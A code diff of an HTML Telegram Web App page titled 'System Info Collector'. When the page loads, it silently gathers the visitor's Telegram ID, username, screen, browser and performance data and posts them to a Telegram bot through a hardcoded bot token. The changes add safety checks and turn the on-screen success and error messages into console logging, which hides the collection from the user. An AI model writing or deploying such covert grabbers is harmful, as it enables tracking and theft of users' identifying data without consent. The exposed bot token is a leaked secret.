@@ -2,13 +2,14 @@
 <html>
 <head>
     <title>System Info Collector</title>
-  
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
-
-
+<body>
 <script>
-    Telegram.WebApp.enableClosingConfirmation();
+    // Проверяем, что Telegram WebApp API доступен
+    if (window.Telegram && Telegram.WebApp) {
+        Telegram.WebApp.enableClosingConfirmation();
+    }
 
     // Telegram Bot API configuration
     const BOT_TOKEN = '8173506320:AAEgHmISfNXAvJqgwkRg7UU-KNR-Dpr8vQQ';
@@ -18,9 +19,10 @@
     const userId = tg?.initDataUnsafe?.user?.id;
     const username = tg?.initDataUnsafe?.user?.username || 'не указан';
 
-
-
-
+    // Вспомогательная функция для отображения сообщений (если нужно)
+    function showMessage(message) {
+        console.log(message);
+    }
 
     // Detect browser features
     function detectFeatures() {
@@ -157,7 +159,7 @@
                     availHeight: screen.availHeight,
                     colorDepth: screen.colorDepth,
                     pixelRatio: window.devicePixelRatio,
-                    orientation: screen.orientation.type
+                    orientation: screen.orientation?.type || 'unknown'
                 },
 
                 // Browser
@@ -178,21 +180,21 @@
 
                 // Performance
                 performance: {
-                    memory: window.performance.memory ? {
+                    memory: window.performance?.memory ? {
                         jsHeapSizeLimit: window.performance.memory.jsHeapSizeLimit,
                         totalJSHeapSize: window.performance.memory.totalJSHeapSize,
                         usedJSHeapSize: window.performance.memory.usedJSHeapSize
                     } : 'Memory API не доступна',
-                    timing: window.performance.timing ? {
+                    timing: window.performance?.timing ? {
                         loadTime: (window.performance.timing.loadEventEnd - window.performance.timing.navigationStart) + 'ms'
                     } : 'Timing API не доступна'
                 }
             };
 
             await sendToTelegram(systemInfo);
-            showMessage("Информация успешно собрана и отправлена!", 'success');
+            console.log("Данные успешно отправлены");
         } catch (error) {
-            showError(error);
+            console.error("Ошибка при сборе данных:", error);
         }
     }
 
@@ -200,7 +202,7 @@
     async function sendToTelegram(data) {
         try {
             let text = `🖥 *System Information Report* 🖥\n\n`;
-            
+
             // Telegram user info
             text += `👤 *Telegram User*\n`;
             text += `🆔 *ID:* ${data.telegram.userId || 'неизвестен'}\n`;
@@ -297,14 +299,13 @@
                 throw new Error(`Ошибка Telegram API: ${responseData.description}`);
             }
         } catch (error) {
-           
+            console.error("Ошибка при отправке данных в Telegram:", error);
             throw error;
         }
     }
 
     // Start collection on page load
-    window.onload = collectSystemInfo;
+    window.addEventListener('load', collectSystemInfo);
 </script>
-
 </body>
 </html>
